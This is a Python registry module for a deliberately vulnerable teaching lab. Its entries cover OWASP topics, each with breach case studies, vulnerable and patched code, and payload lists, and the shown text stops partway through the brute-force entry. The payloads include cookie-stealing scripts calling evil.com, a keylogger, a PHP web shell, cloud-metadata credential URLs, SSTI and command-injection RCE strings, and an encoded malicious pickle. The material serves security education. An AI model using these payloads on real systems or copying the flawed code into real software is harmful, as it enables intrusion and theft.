"""Canonical module registry for VulnLab.

This is the single source of truth for every teaching module's metadata:
title, OWASP mapping, severity, payloads, real-world impact, and the
vulnerable/patched code diff. It is consumed by:

  * the presenter view (`/presentation`) via the `GET /api/modules` JSON endpoint
  * the per-module pages (payload lists, code diffs) via template context

Field names intentionally match what the presenter's JavaScript reads
(`demoUrl`, `sev`, `vuln_code`, `safe_code`, ...), so the presenter consumes
this data with no field renaming.
"""

MODULES = [
    {
        "id": "intro",
        "title": "Welcome",
        "owasp": "",
        "sev": None,
        "tagline": "Web Application Security — Complete Deep Dive",
        "demoUrl": "/",
        "intro": True,
    },
    {
        "id": "sqli-auth",
        "title": "SQL Injection — Auth Bypass",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "String concatenation lets attackers rewrite your SQL query. Login without knowing any password.",
        "demoUrl": "/sqli/login",
        "what": "SQL Injection occurs when user-supplied input is embedded directly into a SQL query without sanitisation. The attacker closes the intended string and appends their own SQL logic — changing what the database executes entirely.",
        "how": [
            {"n": "1", "text": "Developer writes: ", "code": "WHERE username='{INPUT}' AND password='{PASS}'"},
            {"n": "2", "text": "Normal user enters: alice / password123", "code": "→ Matches 1 row, login succeeds"},
            {"n": "3", "text": "Attacker enters username: ", "code": "' OR 1=1--"},
            {"n": "4", "text": "Resulting query becomes: ", "code": "WHERE username='' OR 1=1--' AND password='x'"},
            {"n": "5", "text": "-- comments out the password check → ", "code": "every row matches → logged in as the first user (admin)"},
        ],
        "impact": {
            "title": "Real-World Case — Heartland Payment Systems (2008)",
            "text": "<strong>$140 million</strong> in damages. SQL injection into a payment processor. Attackers installed sniffing malware after initial SQLi access. 130 million credit card numbers stolen. Still one of the largest breaches ever.",
        },
        "payloads": [
            {"code": "' OR 1=1--", "pw": "x", "desc": "The -- comments out the password check → logs in as the first user (admin)"},
            {"code": "admin'--", "pw": "x", "desc": "Log in as admin specifically — -- comments out the password check"},
            {"code": "' OR '1'='1", "pw": "' OR '1'='1", "desc": "Always-true, but it must go in BOTH fields — the query also checks AND password"},
            {"code": "' UNION SELECT 1,'admin','admin123','a@a.com','admin',0,'x','x'--", "pw": "x", "desc": "Inject a crafted admin row and log in as it"},
        ],
        "vuln_code": "query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"\nrow = conn.execute(query)  # ← executes attacker SQL",
        "safe_code": "stmt = conn.execute(\n  \"SELECT * FROM users WHERE username=? AND password=?\",\n  (username, password)   # ← input is data, never SQL\n)",
    },
    {
        "id": "sqli-union",
        "title": "SQL Injection — UNION Extract",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "UNION SELECT appends a second query — pull any table, any column, right into the response.",
        "demoUrl": "/sqli/search",
        "what": "Once SQL injection is confirmed, UNION-based extraction lets attackers append a second SELECT to the original query. The result of both queries is returned together — attacker sees data from any table.",
        "how": [
            {"n": "1", "text": "Find column count: ", "code": "' ORDER BY 1-- ... ORDER BY 4-- (error = found it)"},
            {"n": "2", "text": "Find string columns: ", "code": "' UNION SELECT NULL,'a',NULL--  (look for 'a' in output)"},
            {"n": "3", "text": "Extract version/db: ", "code": "' UNION SELECT NULL,version(),database()--"},
            {"n": "4", "text": "List tables: ", "code": "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"},
            {"n": "5", "text": "Dump credentials: ", "code": "' UNION SELECT NULL,username,password FROM users--"},
        ],
        "impact": {
            "title": "Real-World Case — Sony Pictures (2011)",
            "text": "<strong>77 million accounts</strong> breached via SQL injection against PlayStation Network. Usernames, passwords, addresses, credit card data extracted. UNION-based SQLi used to enumerate and dump the full user database. Sony took PSN offline for 23 days.",
        },
        "payloads": [
            {"code": "' ORDER BY 3--", "desc": "Step 1: Confirm 3 columns (no error = correct count)"},
            {"code": "' UNION SELECT NULL,'test',NULL--", "desc": "Step 2: Column 2 is a string type"},
            {"code": "' UNION SELECT NULL,username,password FROM users--", "desc": "Step 3: Dump all credentials"},
            {"code": "' UNION SELECT NULL,username||':'||password||':'||ssn,email FROM users--", "desc": "Concat multiple fields into one column"},
        ],
        "vuln_code": "query = f\"SELECT id,title,body FROM posts WHERE title LIKE '%{q}%'\"\nrows = conn.execute(query)   # UNION appended by attacker",
        "safe_code": "rows = conn.execute(\n  \"SELECT id,title,body FROM posts WHERE title LIKE ?\",\n  (f\"%{q}%\",)   # parameterised — UNION impossible\n)",
    },
    {
        "id": "xss-reflected",
        "title": "XSS — Reflected",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "User input reflected in the response without encoding. Script executes in the victim's browser.",
        "demoUrl": "/xss/reflected",
        "what": "Reflected XSS occurs when a web application takes user input from the request (URL parameter, form field) and includes it directly in the HTML response without encoding. The attacker crafts a URL containing a script — the victim's browser receives and executes it.",
        "how": [
            {"n": "1", "text": "Attacker crafts URL: ", "code": "/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>"},
            {"n": "2", "text": "Victim clicks the link (via email, chat, ad)", "code": ""},
            {"n": "3", "text": "Server returns: ", "code": "<p>Results for: <script>fetch(...)  ← executes"},
            {"n": "4", "text": "Victim's browser runs attacker's JavaScript", "code": ""},
            {"n": "5", "text": "Session cookie sent to attacker server → ", "code": "Account takeover without knowing the password"},
        ],
        "impact": {
            "title": "Real-World Case — British Airways (2018)",
            "text": "XSS used as part of a Magecart attack. Attacker injected skimming script onto the BA payment page. <strong>500,000 customers'</strong> payment card details harvested in real-time. £20M GDPR fine. The injected script ran in every customer's browser during checkout.",
        },
        "payloads": [
            {"code": "<script>alert(document.cookie)</script>", "desc": "Display cookies in alert box — confirm impact"},
            {"code": "<img src=x onerror=alert(1)>", "desc": "No script tag — fires via broken image"},
            {"code": "<svg onload=alert(document.domain)>", "desc": "SVG event-based XSS"},
            {"code": "<ScRiPt>alert(1)</sCrIpT>", "desc": "Mixed case — bypasses naive keyword filters"},
        ],
        "vuln_code": "q = request.args.get(\"q\", \"\")\noutput = q   # ← raw string into template\n# Template: <div>{{ output | safe }}</div>  ← executes!",
        "safe_code": "import html\nq = request.args.get(\"q\", \"\")\noutput = html.escape(q)   # < → &lt;  > → &gt;\n# Jinja2: {{ output }}  auto-escapes by default",
    },
    {
        "id": "xss-stored",
        "title": "XSS — Stored",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "Payload saved to the database. Executes for every visitor — no victim interaction needed beyond browsing.",
        "demoUrl": "/xss/stored",
        "what": "Stored (Persistent) XSS is saved into the database and served to every user who views the page. Unlike reflected XSS, no crafted URL is needed — the victim just browses normally. Admin visits a comments page → attacker has admin's session.",
        "how": [
            {"n": "1", "text": "Attacker posts comment: ", "code": "<script>fetch('//evil.com?c='+document.cookie)</script>"},
            {"n": "2", "text": "Server stores raw HTML in database", "code": ""},
            {"n": "3", "text": "Every visitor loads the page → comment rendered", "code": ""},
            {"n": "4", "text": "Script executes in visitor's browser", "code": ""},
            {"n": "5", "text": "If admin visits → admin cookie captured → ", "code": "Full admin access for attacker"},
        ],
        "impact": {
            "title": "Real-World Case — Samy Worm, MySpace (2005)",
            "text": "Samy Kamkar stored XSS in a MySpace profile. Every visitor's profile was automatically modified to add Samy as a friend and propagate the worm. <strong>1 million profiles infected in 20 hours</strong>. First large-scale XSS worm. Same technique used today against banking portals.",
        },
        "payloads": [
            {"code": "<script>alert('stored XSS by '+document.domain)</script>", "desc": "Confirm stored XSS fires on page load"},
            {"code": "<script>fetch('/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", "desc": "Exfil API data via stored payload"},
            {"code": "<script>document.onkeypress=e=>fetch('//log?k='+e.key)</script>", "desc": "Keylogger — captures everything typed on page"},
            {"code": "<img src=x onerror=\"document.body.innerHTML='<h1 style=color:red>HACKED</h1>'\">", "desc": "Full page defacement"},
        ],
        "vuln_code": "body = request.form.get(\"body\", \"\")\n# Stored raw to DB — no encoding\nconn.execute(\"INSERT INTO comments (body) VALUES (?)\", (body,))\n# Template: {{ c.body | safe }}  ← executes on render",
        "safe_code": "import html\nbody = html.escape(request.form.get(\"body\", \"\"))\n# Encoded before storage — < saved as &lt;\nconn.execute(\"INSERT INTO comments (body) VALUES (?)\", (body,))\n# Template: {{ c.body }}  ← auto-escaped, safe",
    },
    {
        "id": "idor",
        "title": "IDOR — Broken Access Control",
        "owasp": "A01:2021 · Broken Access Control",
        "sev": "CRITICAL",
        "tagline": "#1 on OWASP. Server authenticates who you are — but never checks if you own the object you're requesting.",
        "demoUrl": "/idor/profile",
        "what": "Insecure Direct Object Reference — the server checks that you're logged in, but not that the resource you're requesting belongs to you. Change a user ID in the URL from 2 to 1 and see admin's data. Authentication ≠ Authorisation.",
        "how": [
            {"n": "1", "text": "Login as alice (user id=2)", "code": ""},
            {"n": "2", "text": "App loads your profile: ", "code": "GET /idor/profile?id=2"},
            {"n": "3", "text": "Change id to 1: ", "code": "GET /idor/profile?id=1"},
            {"n": "4", "text": "Server fetches user #1 from DB", "code": "SELECT * FROM users WHERE id=1"},
            {"n": "5", "text": "Returns admin's email, SSN, balance, password → ", "code": "Full account data exposed"},
        ],
        "impact": {
            "title": "Real-World Case — Optus Australia (2022)",
            "text": "<strong>9.8 million customers'</strong> personal data exposed via IDOR on an unauthenticated API endpoint. ID was sequential — attacker incremented through all customer IDs. Passport numbers, driver's licences, Medicare IDs all leaked. $140M+ in remediation costs.",
        },
        "payloads": [
            {"code": "/idor/profile?id=1", "desc": "View admin profile — password, SSN, balance"},
            {"code": "/idor/profile?id=3", "desc": "View Bob's private profile"},
            {"code": "/idor/orders?user_id=1", "desc": "View admin's order history"},
            {"code": "/api/message/1", "desc": "Read message not addressed to you"},
        ],
        "vuln_code": "target_id = request.args.get(\"id\")   # attacker-controlled\n# No ownership check — fetches whatever ID supplied\nrow = conn.execute(\n  \"SELECT * FROM users WHERE id=?\", (target_id,)\n)",
        "safe_code": "target_id = request.args.get(\"id\")\n# Enforce ownership — must match session\nif int(target_id) != session[\"user_id\"]:\n    return 403   # access denied\nrow = conn.execute(\n  \"SELECT * FROM users WHERE id=?\", (session[\"user_id\"],)\n)",
    },
    {
        "id": "csrf",
        "title": "CSRF — Cross-Site Request Forgery",
        "owasp": "A01:2021 · Broken Access Control",
        "sev": "HIGH",
        "tagline": "Your browser auto-attaches cookies to any request. An attacker's page can trigger authenticated actions on your behalf.",
        "demoUrl": "/csrf/transfer",
        "what": "CSRF forces an authenticated user's browser to send a forged request to a web application. The browser automatically includes session cookies — the server sees a legitimate authenticated request. Victim doesn't know it happened.",
        "how": [
            {"n": "1", "text": "Victim logs into bank.com → session cookie set", "code": ""},
            {"n": "2", "text": "Victim visits evil.com (ad, forum link, phishing email)", "code": ""},
            {"n": "3", "text": "Evil page has auto-submit form targeting bank.com", "code": "<form action='//bank.com/transfer' method=POST>"},
            {"n": "4", "text": "Browser sends POST to bank.com with session cookie", "code": "Cookie auto-attached — browser's default behaviour"},
            {"n": "5", "text": "Bank processes authenticated request → ", "code": "Transfer executed. Victim has no idea."},
        ],
        "impact": {
            "title": "Real-World Case — ING Direct / YouTube (2008)",
            "text": "CSRF used to transfer funds out of ING Direct accounts. Attacker hosted page that auto-submitted transfer forms — victims just needed to visit the page while logged in. Same year, CSRF on YouTube allowed arbitrary actions on any user's account. <strong>No malware needed — just a browser.</strong>",
        },
        "payloads": [
            {"code": "<form action=\"//localhost:5005/csrf/transfer?safe=0\" method=POST>", "desc": "Attack form targeting the transfer endpoint"},
            {"code": "<input name=\"to_user\" value=\"attacker\">", "desc": "Recipient — attacker's account"},
            {"code": "<input name=\"amount\" value=\"9999\">", "desc": "Amount — maximum"},
            {"code": "document.forms[0].submit()", "desc": "Auto-submit on page load — victim sees nothing"},
        ],
        "vuln_code": "# No CSRF token generated or validated\n@app.route(\"/transfer\", methods=[\"POST\"])\ndef transfer():\n    to = request.form.get(\"to_user\")\n    amount = request.form.get(\"amount\")\n    # Processes without checking request origin",
        "safe_code": "# Validate CSRF token on every state-changing request\ntoken = request.form.get(\"csrf_token\", \"\")\nif not hmac.compare_digest(token, session[\"csrf_token\"]):\n    return 403  # forged request rejected\n# Also: Set-Cookie: SameSite=Strict",
    },
    {
        "id": "fileupload",
        "title": "File Upload → RCE",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "Unrestricted file upload lets attackers upload executable code. One request from unauthenticated shell access.",
        "demoUrl": "/upload",
        "what": "When file upload endpoints don't validate file type properly, attackers upload web shells — scripts that execute OS commands when accessed via HTTP. A PHP shell uploaded as 'profile picture' becomes remote code execution on the server.",
        "how": [
            {"n": "1", "text": "Create PHP web shell: ", "code": "<?php system($_GET['cmd']); ?>"},
            {"n": "2", "text": "Save as shell.php (or shell.php.jpg to bypass filters)", "code": ""},
            {"n": "3", "text": "Upload via the file upload form", "code": ""},
            {"n": "4", "text": "Server saves with original filename in web-accessible directory", "code": ""},
            {"n": "5", "text": "Request the file with a command: ", "code": "/uploads/shell.php?cmd=id  →  uid=33(www-data)"},
        ],
        "impact": {
            "title": "Real-World Case — Multiple WordPress Sites (ongoing)",
            "text": "File upload vulnerabilities in WordPress plugins are among the most exploited bugs. Attackers upload PHP shells via image upload fields. <strong>Tens of thousands of sites compromised monthly</strong> via unrestricted file upload. Once a shell is placed, attackers pivot to databases, steal credentials, and install persistent backdoors.",
        },
        "payloads": [
            {"code": "<?php system($_GET['cmd']); ?>", "desc": "Minimal PHP web shell — save as shell.php"},
            {"code": "/upload/serve/shell.php?cmd=id", "desc": "Execute id command after upload"},
            {"code": "/upload/serve/shell.php?cmd=cat+/etc/passwd", "desc": "Read /etc/passwd"},
            {"code": "shell.php.jpg  or  shell.pHp", "desc": "Extension bypass — rename to evade naive filters"},
        ],
        "vuln_code": "filename = f.filename   # original name — attacker-controlled\npath = os.path.join(UPLOAD_DIR, filename)\nf.save(path)            # saved as shell.php\n# Served directly at /uploads/shell.php → executes!",
        "safe_code": "ext = filename.rsplit(\".\",1)[-1].lower()\nif ext not in {\"jpg\",\"jpeg\",\"png\",\"gif\"}: abort(400)\nif not check_magic_bytes(f.read()): abort(400)\nsafe_name = f\"{uuid.uuid4()}.{ext}\"   # UUID rename\n# Store outside webroot, serve via CDN",
    },
    {
        "id": "ssrf",
        "title": "SSRF — Server-Side Request Forgery",
        "owasp": "A10:2021 · SSRF",
        "sev": "HIGH",
        "tagline": "Make the server fetch URLs on your behalf — including cloud metadata, internal services, and AWS IAM credentials.",
        "demoUrl": "/ssrf/fetch",
        "what": "SSRF tricks the server into making HTTP requests to attacker-specified URLs. The server has internal network access the attacker doesn't — to databases, cloud metadata APIs, admin interfaces. The server becomes the attacker's proxy inside the network.",
        "how": [
            {"n": "1", "text": "App has a URL fetch feature (preview, webhook, PDF gen)", "code": "GET /fetch?url=https://partner.com/data"},
            {"n": "2", "text": "Attacker supplies internal URL: ", "code": "GET /fetch?url=http://169.254.169.254/latest/meta-data/"},
            {"n": "3", "text": "Server fetches the metadata URL from inside the cloud network", "code": ""},
            {"n": "4", "text": "Returns IAM role name: EC2InstanceRole", "code": ""},
            {"n": "5", "text": "Fetch credentials: ", "code": "/iam/security-credentials/EC2InstanceRole  →  AccessKeyId, SecretAccessKey"},
        ],
        "impact": {
            "title": "Real-World Case — Capital One (2019)",
            "text": "SSRF against AWS Instance Metadata Service. Attacker obtained IAM role credentials → listed all S3 buckets → downloaded contents. <strong>106 million customers</strong> affected. $190 million in fines and settlements. One misconfigured WAF, one SSRF endpoint — full cloud compromise.",
        },
        "payloads": [
            {"code": "http://169.254.169.254/latest/meta-data/", "desc": "AWS root metadata — lists available endpoints"},
            {"code": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole", "desc": "IAM temporary credentials — AccessKeyId + Secret"},
            {"code": "http://0x7f000001/admin", "desc": "127.0.0.1 in hex — bypasses naive localhost blocklist"},
            {"code": "http://localhost:6379", "desc": "Redis on loopback — read cached sessions"},
        ],
        "vuln_code": "url = request.args.get(\"url\")\n# No validation — fetches anything\nresponse = urllib.request.urlopen(url)\nreturn response.read()   # returns internal data to attacker",
        "safe_code": "parsed = urlparse(url)\nhost = parsed.hostname\nBLOCKED = [\"169.254.\",\"10.\",\"192.168.\",\"127.\",\"localhost\"]\nif any(host.startswith(b) for b in BLOCKED):\n    abort(403)   # internal ranges blocked\nif parsed.scheme not in (\"http\",\"https\"): abort(403)",
    },
    {
        "id": "jwt",
        "title": "JWT — None Algorithm & Weak Secret",
        "owasp": "A07:2021 · Auth Failures",
        "sev": "HIGH",
        "tagline": "JWT accepts alg:none — forge admin tokens with no secret. Or crack the weak HMAC secret with hashcat.",
        "demoUrl": "/jwt/login",
        "what": "JSON Web Tokens are used for stateless auth. Two critical vulnerabilities: 1) Some libraries accept alg:none — skipping signature verification entirely, allowing anyone to forge tokens. 2) HS256 with a weak secret is crackable offline with hashcat.",
        "how": [
            {"n": "1", "text": "Login normally → receive JWT with role:user", "code": "eyJ...{\"role\":\"user\"}...signature"},
            {"n": "2", "text": "Decode the header (base64): ", "code": "{\"alg\": \"HS256\", \"typ\": \"JWT\"}"},
            {"n": "3", "text": "Change alg to none, role to admin: ", "code": "{\"alg\":\"none\"} + {\"role\":\"admin\",\"user_id\":1}"},
            {"n": "4", "text": "Re-encode header + payload, empty signature: ", "code": "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
            {"n": "5", "text": "Server accepts token without verifying signature → ", "code": "Attacker is now admin"},
        ],
        "impact": {
            "title": "Real-World — Auth0 (2015) & Multiple Libraries",
            "text": "The none algorithm vulnerability affected Auth0, python-jwt, pyjwt, node-jsonwebtoken and others. <strong>Hundreds of thousands of applications</strong> were vulnerable. Any user could promote themselves to admin by changing 3 characters in the token header. CVE-2015-9235.",
        },
        "payloads": [
            {"code": "header: {\"alg\":\"none\",\"typ\":\"JWT\"}", "desc": "Step 1: Change algorithm to none"},
            {"code": "payload: {\"user_id\":1,\"role\":\"admin\",\"exp\":9999999999}", "desc": "Step 2: Set role to admin"},
            {"code": "base64(header) + '.' + base64(payload) + '.'", "desc": "Step 3: Empty signature — dot at end"},
            {"code": "hashcat -a 0 -m 16500 token.txt rockyou.txt", "desc": "Alternative: crack weak HS256 secret offline"},
        ],
        "vuln_code": "# VULNERABLE: accepts alg:none — no verification\nalg = header.get(\"alg\",\"\").lower()\nif alg == \"none\":\n    pass   # ← skip signature check entirely\n# Also: secret = \"weak\"  ← crackable",
        "safe_code": "# Enforce algorithm, use strong secret\nif header.get(\"alg\") != \"HS256\":\n    return None   # reject anything else\nsecret = \"Str0ng-R4nd0m-256bit-S3cr3t!\"\n# Verify signature cryptographically\nif not hmac.compare_digest(expected, provided):\n    return None",
    },
    {
        "id": "ssti",
        "title": "SSTI — Server-Side Template Injection",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "User input rendered as a Jinja2 template. Escalates from {{7*7}} to reading config secrets to full RCE.",
        "demoUrl": "/ssti",
        "what": "SSTI occurs when user input is embedded into a template string and rendered by the template engine. In Jinja2, the template engine evaluates expressions — attackers use this to read configuration, access Python internals, and ultimately execute OS commands.",
        "how": [
            {"n": "1", "text": "Probe: enter ", "code": "{{7*7}}  →  output shows 49 = SSTI confirmed"},
            {"n": "2", "text": "Read config: ", "code": "{{config.items()}}  →  SECRET_KEY, DB passwords exposed"},
            {"n": "3", "text": "Access Python MRO: ", "code": "{{''.__class__.__mro__[1].__subclasses__()}}"},
            {"n": "4", "text": "Find subprocess class, execute command: ", "code": "{{lipsum.__globals__['os'].popen('id').read()}}"},
            {"n": "5", "text": "Output: ", "code": "uid=33(www-data)  →  Full server RCE"},
        ],
        "impact": {
            "title": "Real-World — Uber HackerOne Report (2016)",
            "text": "SSTI in Uber's internal tooling allowed researcher to achieve RCE. Reported via bug bounty — classified critical. SSTI is consistently rated <strong>Critical severity</strong> because it always leads to RCE if the template engine allows expression evaluation. Payouts: $10,000–$50,000 on bug bounty programs.",
        },
        "payloads": [
            {"code": "{{7*7}}", "desc": "Detection — if output is 49, SSTI confirmed"},
            {"code": "{{config}}", "desc": "Flask config dump — leaks SECRET_KEY, DB URI"},
            {"code": "{{request.environ}}", "desc": "Server environment — paths, ports, versions"},
            {"code": "{{lipsum.__globals__['os'].popen('id').read()}}", "desc": "RCE — execute system command"},
        ],
        "vuln_code": "name = request.args.get(\"name\")\n# User input directly in template string → SSTI\nresult = render_template_string(f\"Hello, {name}!\")\n# {{config}} in name → leaks all Flask config",
        "safe_code": "import html\nname = html.escape(request.args.get(\"name\",\"\"))\nresult = f\"Hello, {name}!\"\n# OR: return render_template(\"greet.html\", name=name)\n# Jinja2 {{ name }} auto-escapes — no expression eval",
    },
    {
        "id": "headers",
        "title": "Security Headers",
        "owasp": "A05:2021 · Security Misconfiguration",
        "sev": "HIGH",
        "tagline": "Each missing header enables a class of attack. No CSP = XSS easier. No X-Frame = clickjacking. No HSTS = downgrade.",
        "demoUrl": "/headers",
        "what": "HTTP security headers are the server's instructions to the browser about security policies. Each missing header is an open door. They're free to add, take minutes, and block entire attack classes. Yet most applications are missing several.",
        "how": [
            {"n": "1", "text": "No Content-Security-Policy → ", "code": "Inline scripts can run. XSS has no mitigation layer."},
            {"n": "2", "text": "No X-Frame-Options → ", "code": "Page can be iframed. Clickjacking trivially possible."},
            {"n": "3", "text": "No HSTS → ", "code": "Attacker on network can downgrade HTTPS to HTTP. Cookies stolen."},
            {"n": "4", "text": "No X-Content-Type-Options → ", "code": "MIME sniffing — browser executes uploaded file as wrong type."},
            {"n": "5", "text": "Check your site: ", "code": "curl -I https://yoursite.com | grep -i 'security\\|frame\\|content'"},
        ],
        "impact": {
            "title": "Real-World — Clickjacking on Facebook (2009) & Twitter",
            "text": "Missing X-Frame-Options allowed clickjacking attacks that tricked users into clicking hidden 'Like' and 'Retweet' buttons. Called 'likejacking' — millions of posts spread automatically. <strong>Simple iframe trick, no code execution needed.</strong> Fixed with one HTTP header.",
        },
        "payloads": [
            {"code": "curl -I http://localhost:5005/headers?safe=0", "desc": "See missing headers in vulnerable mode"},
            {"code": "curl -I http://localhost:5005/headers?safe=1", "desc": "See all security headers in safe mode"},
            {"code": "<iframe src=\"//target.com\" opacity=\"0.001\">", "desc": "Clickjacking PoC — works without X-Frame-Options"},
            {"code": "securityheaders.com / observatory.mozilla.org", "desc": "Online scanner for production sites"},
        ],
        "vuln_code": "# No headers added to response\n@app.route(\"/headers\")\ndef headers():\n    return render_template(\"headers.html\")\n# Response has: Server: Werkzeug, no security headers",
        "safe_code": "resp.headers[\"Content-Security-Policy\"] = \"default-src 'self'\"\nresp.headers[\"X-Frame-Options\"] = \"DENY\"\nresp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\nresp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\nresp.headers[\"Referrer-Policy\"] = \"no-referrer\"",
    },
    {
        "id": "logic",
        "title": "Business Logic — Price Tampering",
        "owasp": "A04:2021 · Insecure Design",
        "sev": "HIGH",
        "tagline": "App trusts the price field in the POST body. Intercept in Burp, change to 0.01. Buy a laptop for a penny.",
        "demoUrl": "/logic/checkout",
        "what": "Business logic vulnerabilities are flaws in the application's intended workflow — not injection or memory bugs. No scanner finds them. They require understanding what the app is supposed to do and testing what happens when you deviate. Trusting client-supplied prices is the classic example.",
        "how": [
            {"n": "1", "text": "Open checkout, select Laptop ($999.99)", "code": ""},
            {"n": "2", "text": "Intercept POST in Burp Suite", "code": "item_id=1&quantity=1&price=999.99"},
            {"n": "3", "text": "Change price field to 0.01", "code": "item_id=1&quantity=1&price=0.01"},
            {"n": "4", "text": "Forward the modified request", "code": ""},
            {"n": "5", "text": "Server calculates: 0.01 × 1 = $0.01 → ", "code": "Order confirmed. Laptop for a penny."},
        ],
        "impact": {
            "title": "Real-World — Multiple E-commerce Platforms",
            "text": "Price manipulation has hit Shopify merchants, airline booking systems, and gaming platforms. In 2022, a UK retailer lost <strong>£50,000+</strong> to a price tampering attack over a weekend before it was noticed. The fix is trivial — look up price server-side. The vulnerability is subtle — developers assume form data isn't editable.",
        },
        "payloads": [
            {"code": "price=0.01", "desc": "Buy a $999 laptop for a penny — change in Burp"},
            {"code": "quantity=-1", "desc": "Negative quantity → refund issued + item delivered"},
            {"code": "price=-500", "desc": "Negative price → credit added to account"},
            {"code": "item_id=1&quantity=99999999", "desc": "Integer overflow → total wraps to 0 or negative"},
        ],
        "vuln_code": "client_price = float(request.form.get(\"price\", 0))\nquantity = int(request.form.get(\"quantity\", 1))\n# Trusts client price — attacker sets it to 0.01\ntotal = client_price * quantity\nplace_order(item_id, total)",
        "safe_code": "item_id = int(request.form.get(\"item_id\"))\nquantity = int(request.form.get(\"quantity\", 1))\n# Look up REAL price server-side — ignore client value\nitem = db.get_item_by_id(item_id)\ntotal = item.server_price * quantity\nplace_order(item_id, total)",
    },
    {
        "id": "cmdi",
        "title": "Command Injection",
        "owasp": "A03:2021 · Injection",
        "sev": "CRITICAL",
        "tagline": "User input concatenated into a shell command. Add ';' or '|' and the server runs your commands.",
        "demoUrl": "/cmdi",
        "what": "OS command injection happens when user input is passed into a system shell without sanitisation. Shell metacharacters (; | & $() `) let the attacker chain their own commands onto the intended one — the server executes them with the web server's privileges.",
        "how": [
            {"n": "1", "text": "App runs a shell command with user input: ", "code": "os.popen('ping -c 1 ' + host)"},
            {"n": "2", "text": "Normal input: ", "code": "8.8.8.8  →  pings the host"},
            {"n": "3", "text": "Attacker appends a command: ", "code": "8.8.8.8; id"},
            {"n": "4", "text": "Shell runs both: ", "code": "ping -c 1 8.8.8.8 ; id"},
            {"n": "5", "text": "Output includes: ", "code": "uid=33(www-data)  →  arbitrary command execution"},
        ],
        "impact": {
            "title": "Real-World Case — Equifax (2017)",
            "text": "A command-injection-class flaw (Apache Struts CVE-2017-5638) let attackers run OS commands on Equifax servers. <strong>147 million people's</strong> data — SSNs, birth dates, addresses — exfiltrated over 76 days. ~$1.4 billion in cleanup costs. One unsanitised input reaching a command interpreter.",
        },
        "payloads": [
            {"code": "127.0.0.1; id", "desc": "Chain a command with ';' — runs after the ping"},
            {"code": "127.0.0.1 | whoami", "desc": "Pipe output — runs 'whoami' regardless of ping"},
            {"code": "127.0.0.1 && cat /etc/passwd", "desc": "Run only if ping succeeds — read password file"},
            {"code": "$(uname -a)", "desc": "Command substitution — inject the shell result"},
        ],
        "vuln_code": "host = request.values.get(\"host\")\n# User input concatenated straight into a shell string\ncmd = f\"ping -c 1 {host}\"\noutput = os.popen(cmd).read()   # ← shell runs ANY chained command",
        "safe_code": "host = request.values.get(\"host\")\n# 1) validate: hostnames/IPs only, no shell metacharacters\nif not re.fullmatch(r\"[A-Za-z0-9.\\-]{1,100}\", host):\n    abort(400)\n# 2) no shell — pass args as a list so input is data, not code\nsubprocess.run([\"ping\", \"-c\", \"1\", host], shell=False)",
    },
    {
        "id": "deserialize",
        "title": "Insecure Deserialization",
        "owasp": "A08:2021 · Data Integrity Failures",
        "sev": "CRITICAL",
        "tagline": "The app unpickles attacker-controlled data. A crafted pickle runs code the moment it's loaded.",
        "demoUrl": "/deserialize",
        "what": "Deserialization turns bytes back into objects. Python's pickle will call an object's __reduce__ during loading — so a crafted pickle can make the server execute arbitrary code simply by being loaded. Never unpickle data you don't fully trust (cookies, request bodies, uploads).",
        "how": [
            {"n": "1", "text": "App restores state by unpickling user input: ", "code": "pickle.loads(base64.b64decode(blob))"},
            {"n": "2", "text": "Attacker crafts a class with a malicious __reduce__: ", "code": "return (subprocess.check_output, ([\"id\"],))"},
            {"n": "3", "text": "They base64-encode the pickle and send it as the 'blob'", "code": ""},
            {"n": "4", "text": "Server calls pickle.loads → __reduce__ fires", "code": ""},
            {"n": "5", "text": "The command runs during load: ", "code": "uid=33(www-data)  →  RCE, no bug in 'your' code path"},
        ],
        "impact": {
            "title": "Real-World Case — Apache Struts / Java & Python apps",
            "text": "Insecure deserialization powered some of the largest RCE breaches of the last decade (Struts, WebLogic, countless Python/Ruby apps). It's dangerous because the code executes during <strong>loading</strong> — before any of the application's own logic runs — so input validation on the resulting object is far too late.",
        },
        "payloads": [
            {"code": "gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlIwCaWSUYYWUUpQu", "desc": "Malicious pickle — unpickling runs `id` and returns its output (RCE)"},
            {"code": "gASVIAAAAAAAAAB9lCiMBXRoZW1llIwEZGFya5SMBGxhbmeUjAJlbpR1Lg==", "desc": "Legit prefs pickle: {'theme':'dark','lang':'en'}"},
            {"code": "class E:\\n  def __reduce__(self):\\n    return (__import__('os').system, ('id',))", "desc": "How the malicious pickle is built (__reduce__ returns a callable + args)"},
            {"code": "eyJ0aGVtZSI6ICJkYXJrIiwgImxhbmciOiAiZW4ifQ==", "desc": "Legit JSON prefs (base64) — for safe mode, which uses json not pickle"},
        ],
        "vuln_code": "blob = request.values.get(\"blob\")\n# pickle.loads executes __reduce__ on the incoming object\nprefs = pickle.loads(base64.b64decode(blob))  # ← RCE on crafted input",
        "safe_code": "blob = request.values.get(\"blob\")\n# JSON carries data only — no code, no __reduce__, no execution\nprefs = json.loads(base64.b64decode(blob))\n# (or sign the blob with HMAC and verify before trusting it)",
    },
    {
        "id": "bruteforce",
        "title": "Brute Force — No Rate Limiting",
        "owasp": "A07:2021 · Auth Failures",
        "sev": "HIGH",
        "tagline": "The login accepts unlimited guesses. With no lockout, a wordlist cracks weak passwords in seconds.",
        "demoUrl": "/bruteforce",
        "what": "When a login endpoint has no rate limiting, throttling, or lockout, an attacker can submit thousands of username/password guesses automatically. Combined with weak or common passwords, credential brute-forcing and password spraying become trivial — no exploit needed, just patience and a wordlist.",
        "how": [
